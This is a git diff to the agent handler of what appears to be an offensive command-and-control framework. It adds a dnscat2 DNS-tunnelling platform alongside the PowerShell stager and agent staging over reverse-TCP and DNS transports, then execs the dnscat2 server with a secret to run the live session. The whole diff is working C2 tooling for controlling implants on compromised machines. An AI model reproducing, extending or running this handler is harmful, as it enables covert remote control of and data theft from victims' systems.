@@ -1,10 +1,16 @@
 #!/usr/bin/python3
+import os
+
+from helpers.files import sanatizefilename
 from .transport.dns import TransportDns
 from .transport.reversetcp import TransportReverseTcp
 from .message.message import Message
 from platform.powershell.powershell import PlatformPowershell
+from platform.dnscat2wrapper.dnscat2wrapper import PlatformDnsCat2Wrapper
 from helpers.log import *
 from helpers.modulebase import ModuleBase
+
+DEBUG_MODULE = "Handler"
 
 class Handler(ModuleBase):
     """ Base handler for all interactions with agents """
@@ -32,12 +38,12 @@ class Handler(ModuleBase):
                 'Description'   :   'Platform of agent code',
                 'Required'      :   True,
                 'Value'         :   "POWERSHELL",
-                'Options'       :   ("POWERSHELL",)
+                'Options'       :   ("POWERSHELL","DNSCAT2WRAPPER")
             }
         }
-        self.transport = TransportReverseTcp()
+        self.transport = TransportReverseTcp(self)
         #TODO: CHANNELENCRYPTION?
-        self.platform = PlatformPowershell()
+        self.platform = PlatformPowershell(self)
     
     def setoption(self, name, value):
         """
@@ -46,14 +52,21 @@ class Handler(ModuleBase):
         """
         
         if ModuleBase.setoption(self, name, value):
+            #print_debug(DEBUG_MODULE, "set {} = {}".format(name, value))
             if str(name).upper() == "TRANSPORT":
                 if str(value).upper() == "REVERSETCP":
-                    self.transport = TransportReverseTcp()
+                    print_debug(DEBUG_MODULE, "changing TRANSPORT to REVERSETCP")
+                    self.transport = TransportReverseTcp(self)
                 elif str(value).upper() == "DNS":
-                    self.transport = TransportDns()
+                    print_debug(DEBUG_MODULE, "changing TRANSPORT to DNS")
+                    self.transport = TransportDns(self)
             if str(name).upper() == "PLATFORM":
                 if str(value).upper() == "POWERSHELL":
-                    self.transport = PlatformPowershell()
+                    print_debug(DEBUG_MODULE, "changing PLATFORM to POWERSHELL")
+                    self.platform = PlatformPowershell(self)
+                if str(value).upper() == "DNSCAT2WRAPPER":
+                    print_debug(DEBUG_MODULE, "changing PLATFORM to DNSCAT2WRAPPER")
+                    self.platform = PlatformDnsCat2Wrapper(self)
             return True
         elif self.transport and self.transport.setoption(name, value):
             return True
@@ -80,7 +93,7 @@ class Handler(ModuleBase):
         if not self.validate_options():
             return
         
-        stager = self.platform.getstager(self)
+        stager = self.platform.getstager()
         if stager:
             print_message("Use the following stager code:")
             print_text(stager)
@@ -92,6 +105,8 @@ class Handler(ModuleBase):
         plattform / transport modules.
         """
 
+        exiting = False
+
         if not self.validate_options():
             return
 
@@ -100,27 +115,43 @@ class Handler(ModuleBase):
 
             # if staging is active, provide stager when first conntact
             if self.platform.isstaged():
-                agent = self.platform.getagent(self)
+                agent = self.platform.getagent()
                 print_message("Sending staged agent ({} bytes)...".format(len(agent)))
                 self.transport.send(agent)
                 self.transport.upgradefromstager()
+                print_message("Staging done")
 
-            # if channel encryption, now is the time!
-            if self.options['CHANNELENCRYPTION']['Value'] == "TLS":
-                self.transport.upgradetotls()
+            # special case handling for our hacked DNSCAT2WRAPPER
+            if self.options['PLATFORM']['Value'] != "DNSCAT2WRAPPER":
 
-            message0 = Message()
-            message0.create(0x01, b'Test0')
-            self.transport.sendmessage(message0)
+                # if channel encryption, now is the time!
+                if self.options['CHANNELENCRYPTION']['Value'] == "TLS":
+                    self.transport.upgradetotls()
 
-            message1 = self.transport.receivemessage()
+                message0 = Message()
+                message0.create(0x01, b'Test0')
+                self.transport.sendmessage(message0)
 
-            message2 = Message()
-            message2.create(0x01, b'TestBack')
-            self.transport.sendmessage(message1)
+                message1 = self.transport.receivemessage()
+
+                message2 = Message()
+                message2.create(0x01, b'TestBack')
+                self.transport.sendmessage(message1)
 
         except KeyboardInterrupt:
             print_error("User interrupt, exiting...")
+            exiting = True
 
         finally:
             self.transport.close()
+
+        # special case handling for our hacked DNSCAT2WRAPPER
+        if self.options['PLATFORM']['Value'] == "DNSCAT2WRAPPER" and not exiting:
+            print_message("Starting dnscat2 to handle the real connection")
+            zone = self.transport.options['ZONE']['Value'].rstrip(".")
+            secret = self.platform.secret
+            print_debug(DEBUG_MODULE, "zone = {}, secret = {}".format(zone, secret))
+
+            ruby = "/usr/bin/ruby"
+            scriptpath = sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2/server/dnscat2.rb")
+            os.execv(ruby, [ruby, scriptpath, "--no-cache", "--secret", secret, zone])
